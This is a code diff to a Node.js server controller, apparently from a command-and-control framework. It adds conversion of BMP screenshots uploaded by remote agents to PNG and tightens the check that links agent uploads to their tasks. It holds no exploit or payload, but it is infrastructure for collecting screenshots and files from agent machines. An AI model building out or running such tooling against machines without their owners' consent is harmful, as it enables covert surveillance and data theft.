@@ -7,6 +7,7 @@ import crypto from 'crypto';
 import path from 'path';
 import fs from 'fs';
 import multer from 'multer';
+import jimp from 'jimp';
 import Agent, * as agentModel from '../models/agent.js';
 import Key, * as keyModel from '../models/key.js';
 import Task, * as taskModel from '../models/task.js';
@@ -249,6 +250,26 @@ export const getAgentFiles = (req, res) => {
 };
 
 /**
+ * Convert an uploaded BMP file to PNG. Used for screenshots.
+ * @param {string} bmpFile - Path to the BMP file.
+ * @param {string} pngFile - PNG file path to save to.
+ */
+const convertUploadedBMP = async (bmpFile, pngFile) => {
+
+  return new Promise((resolve, reject) => {
+    jimp.read(bmpFile, (err, image) => {
+      if (err)
+        return reject(err);
+      image.write(pngFile, (err) => {
+        if (err)
+          return reject(err);
+        return resolve();
+      });
+    });
+  });
+};
+
+/**
  * Used by both agents and operators to upload files to the server.
  */
 export const uploadFile = async (req, res) => {
@@ -257,9 +278,10 @@ export const uploadFile = async (req, res) => {
   const agentID = req.params.agentID;
   const taskID = req.params.taskID;
   const userUpload = req.session.loggedIn;
+  let task = null;
   if (!userUpload){
     // Use task ID to verify if agent upload is for a legitimate and incomplete task.
-    const task = await Task.findOne({taskID: taskID.toString(), completed: false});
+    task = await Task.findOne({uid: taskID, agentID, completed: false});
     if (!task)
       return res.status(403).json(PERM_ERROR);
   }
@@ -283,22 +305,36 @@ export const uploadFile = async (req, res) => {
   agentModel.getAgent(agentID).then(agent => {
     uploader(req, res, async (error) => {
       if (error){
-        console.log("Upload error:");
-        console.log(err);
+        logError(`Error uploading file: ${error.message}`);
         return res.status(403).json({error: error.message});
       }
       const uid = path.basename(req.file.path);
-      const orgName = orgFilenames[uid];
+      let orgName = orgFilenames[uid];
+      delete orgFilenames[uid];
+      let fileSize = req.file.size;
+      if ((!userUpload) && task.taskType === "screenshot"){ // Screenshot BMP uploads need extra processing.
+        try{
+          fs.renameSync(req.file.path, req.file.path + ".bmp");
+          await convertUploadedBMP(req.file.path + ".bmp", req.file.path + ".png");
+          fs.renameSync(req.file.path + ".png", req.file.path);
+          fs.unlinkSync(req.file.path + ".bmp");
+          orgName = `screenshot-${Date.now()}.png`;
+          fileSize = fs.statSync(req.file.path).size;
+        }catch(err){
+          logError(`Error converting uploaded BMP file: ${err.message}`);
+          fs.unlinkSync(req.file.path, () => {});
+          return res.status(500).json({});
+        }
+      }
       const file = new File({
         uid,
         agentID: agentID,
         name: orgName,
-        size: req.file.size,
+        size: fileSize,
         downloadsCount: 0,
         dateCreated: Date.now()
       });
       await file.save();
-      delete orgFilenames[uid];
       let msg = userUpload ? (`File received from user '${req.session.username}': ${uid} - ${orgName}`) : (`File received from agent: ${uid} - ${orgName}`);
       global.socketServer.emit("agent_console_output", {
         agentID: agentID.toString(),
